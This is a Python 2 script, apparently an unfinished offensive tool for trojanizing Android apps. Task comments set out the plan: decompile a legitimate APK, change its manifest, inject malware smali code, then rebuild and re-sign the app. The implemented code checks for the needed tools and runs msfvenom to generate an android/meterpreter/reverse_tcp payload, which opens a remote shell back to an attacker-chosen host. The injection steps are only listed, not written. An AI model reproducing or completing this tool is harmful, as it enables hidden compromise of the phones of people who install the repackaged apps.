#!/usr/bin/python2
import subprocess
import argparse
import sys


# tasks:
# - write/include argument parser
#   -> path to original apk             -o or --original
#   -> path to output dir               -out or --output
#   -> path to malware apk              -malware
#   -> or autogenerate meterpreter      -generate
#       -> parse given arguments for metasploit
#
#
# - check if jarsigner is installed
# - check if apktool is installed
# - check if metapsloit is installed but only if metasploit is also needed
# - method that generats metasploit payload
# - method that decompiles given apk
# - method that manipulates the manifest
# - method that injects the call to the malware into the original smali code
#   -> in future the starting point of the malware should be determined dynamic or given per parameters
#   -> think of different ways to launch the malware
# - method that copies malware smali into original smali files 
# - method that builds the apk again
# - method that signs the apk

# global dictonary for the arguments
args={}

def parseArgs():
    global args
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-o", "--original", action="store", dest="original_apk" , default="")
    parser.add_argument("-m", "--malware", action="store", dest="malware_apk", default="")
    parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
    parser.add_argument("--meterpreter_arguments", action="store", nargs=2, dest="meterpreter_arguments", default="")
    args_parsed = parser.parse_args(sys.argv[1:])

    # convert to dictonary
    args = vars(args_parsed)

    if args['meterpreter_arguments'] == "":
        args['metasploit_used'] = False
    else:
        args['metasploit_used'] = True
        # always android reverse shell and alway same output file
        args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp " + str(args['meterpreter_arguments'][0]) + " " + str(args['meterpreter_arguments'][1]) + " -o payload.apk"

# checks if a given program is installed on the computer
# Returns True or False
def isInstalled(program):
    proc = subprocess.Popen(["which " + program], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    if out != "":
        return True
    else:
        return False


def main():
    global args

    parseArgs()
    print args

    # check for used programs
    if args['metasploit_used']:
        if not isInstalled("msfvenom"):
            print "[!] msfvenom (metasploit) is not installed, please install it and rerun the script"
    if not isInstalled("apktool"):
        print "[!] apktool is not installed, please install it and rerun the script"
    if not isInstalled("jarsigner"):
        print "[!] jarsigner is not installed, please install it and rerun the script"

    if args['metasploit_used']:
        command = "msfvenom "+ args['meterpreter_arguments']
        print str(command)
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()

    
main()